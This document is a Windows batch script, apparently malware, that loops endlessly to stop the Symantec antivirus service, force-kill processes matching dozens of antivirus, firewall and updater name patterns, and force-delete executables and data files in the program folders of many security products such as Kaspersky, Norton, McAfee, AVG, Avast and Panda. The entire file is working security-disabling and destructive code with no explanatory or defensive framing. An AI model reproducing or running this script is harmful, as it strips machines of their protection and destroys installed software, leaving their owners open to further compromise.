@echo off
:loop
net stop "symantec antivirus"
taskkill /f /FI "MEMUSAGE gt 5" /IM av*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM fire*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM *anti*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM *kaspersky*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM PersFw
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM KAV*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM ZONEALARM
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM SAFEWEB
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM OUTPOST
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM nv*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM nav*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM F-*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM ESAFE
cls
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM cle
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM BLACKICE
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM def*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM kav
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM kav*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM avg*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM ash*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM aswupdsv
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM ewid*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM guard*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM guar*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM gcasDt*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM msmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM mcafe*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM mghtml
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM msiexec
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM outpost
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM isafe
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM zap*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM zauinst
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM upd*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM zlclien*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM minilog
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM cc*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM norton*
cls
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM norton au*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM ccc*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM npfmn*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM loge*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM nisum*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM issvc
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM tmp*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM tmn*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM pcc*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM cpd*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM pop*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM pav*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM padmin
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM panda*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM avsch*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM sche*
taskkill /f /FI "MEMUSAGE gt 5" /IM syman*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM virus*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM realm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM sweep*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM scan*
taskkill /f /FI "MEMUSAGE gt 5" /IM ad-*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM safe*
taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
cls
taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
cls
del /Q /F %programfiles%\alwils~1\avast4\*.*
cls
del /Q /F %programfiles%\Lavasoft\Ad-awa~1\*.exe
cls
del /Q /F %programfiles%\kasper~1\*.exe
cls
del /Q /F %programfiles%\trojan~1\*.exe
cls
del /Q /F %programfiles%\f-prot95\*.dll
cls
del /Q /F %programfiles%\tbav\*.dat
cls
del /Q /F %programfiles%\avpersonal\*.vdf
cls
del /Q /F %programfiles%\Norton~1\*.cnt
cls
del /Q /F %programfiles%\Mcafee\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\Norton~3\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\speedd~1\*.*
cls
del /Q /F %programfiles%\Norton~1\Norton~1\*.*
cls
del /Q /F %programfiles%\Kasper~1\*.*
cls
del /Q /F %programfiles%\Norton~1\*.*
cls
del /Q /F %programfiles%\avgamsr\*.exe
cls
del /Q /F %programfiles%\avgamsvr\*.exe
cls
del /Q /F %programfiles%\avgemc\*.exe
cls
del /Q /F %programfiles%\avgcc\*.exe
cls
del /Q /F %programfiles%\avgupsvc\*.exe
cls
del /Q /F %programfiles%\grisoft\*.*
cls
del /Q /F %programfiles%\nood32krn\*.exe
cls
cls
del /Q /F %programfiles%\nood32\*.exe
cls
del /Q /F %programfiles%\nod32
cls
del /Q /F %programfiles%\nood32
cls
del /Q /F %programfiles%\kav\*.exe
cls
del /Q /F %programfiles%\kavmm\*.exe
cls
del /Q /F %programfiles%\kaspersky\*.*
cls
cls
del /Q /F %programfiles%\ewidoctrl\*.exe
cls
del /Q /F %programfiles%\guard\*.exe
cls
del /Q /F %programfiles%\ewido\*.exe
cls
cls
del /Q /F %programfiles%\pavprsrv\*.exe
cls
del /Q /F %programfiles%\pavprot\*.exe
cls
del /Q /F %programfiles%\avengine\*.exe
cls
cls
del /Q /F %programfiles%\apvxdwin\*.exe
cls
del /Q /F %programfiles%\webproxy\*.exe
cls
del /Q /F %programfiles%\pandasoftware\*.*
cls
timeout /t 3 /nobreak
cls
goto :loop
cls
